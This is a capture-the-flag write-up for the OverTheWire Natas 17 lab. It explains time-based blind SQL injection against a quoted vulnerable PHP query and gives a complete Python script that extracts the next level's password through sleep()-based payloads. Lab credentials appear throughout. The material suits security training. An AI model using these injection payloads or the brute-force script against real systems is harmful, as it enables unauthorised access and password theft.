---
category: natas
title: Natas17 - SQL Injection Part 3 (Timing-based Injection)
---

website: http://natas17.natas.labs.overthewire.org/ (password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw)

Unlike the challenge in level 15, this challenge has disabled feedback from the backend (see below). As such, we cannot use the technique in level 15.

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
$res = mysql_query($query, $link);
if(mysql_num_rows($res) > 0) {
    //echo "This user exists.<br>";
} else {
    //echo "This user doesn't exist.<br>";
}
mysql_close($link);
```

This time, we can use another type of blind SQL injection: <strong><em>timing-based</em></strong> injection. Let's look at an example.
If we have an input like this: <small>natas18\" and password like \"%a%\" and sleep(5) #</small>,
then the SQL query will look like this:

```sql
SELECT * from users where username="natas18" and password like "%a%" and sleep(5) #
```

As shown above, in addition to the `password like`, we also injected `and sleep(5)` at the end in our input. Here is what it does: If the password contains letter "a", then the query response won't be returned to a client until 5s later. On the other hand, if the password doesn't contain letter "a", then the response will be returned immediately. Based on the time gap between when a request is sent and when a response is received, we will be able to figure out what characters the password contains. Once we have the collections of characters, we follow the same idea used in level 16 to figure out the final password.

The final solution is provided below. Running the python script gives the password "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP".

```python
#!/usr/bin/env python3

import requests
from requests.auth import HTTPBasicAuth


sleep_time = 1
s = requests.Session()
s.auth = HTTPBasicAuth("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
url = 'http://natas17.natas.labs.overthewire.org/?debug'


def get_password_chars():
    filtered_chars = ''
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    print('Looking for password char set...')
    for char in chars:
        data = {'username': f'natas18" and password like binary "%{char}%" and sleep({sleep_time}) #'}
        resp = s.post(url, data=data)
        # print(f'response time: {resp.elapsed.seconds}')

        if resp.elapsed.seconds >= sleep_time:
            filtered_chars += char
            print(f'The password contains: {filtered_chars}')

    return filtered_chars


def get_password(filtered_chars):
    password = ''
    for i in range(32):
        print(f'Looking for position {i}...')

        for char in filtered_chars:
            data = {'username': f'natas18" and password rlike binary "^{password}{char}" and sleep({sleep_time}) #'}
            resp = s.post(url, data=data)

            # print(f'response time: {resp.elapsed.seconds}')
            if resp.elapsed.seconds >= sleep_time:
                password += char
                print(password)
                break

    return password


# Step 1: Find out what chars the password contains
filtered_chars = get_password_chars()

# Step 2: Find out the password by ordering the chars found in step 1
password = get_password(filtered_chars)
print(f'The password: {password}')
```

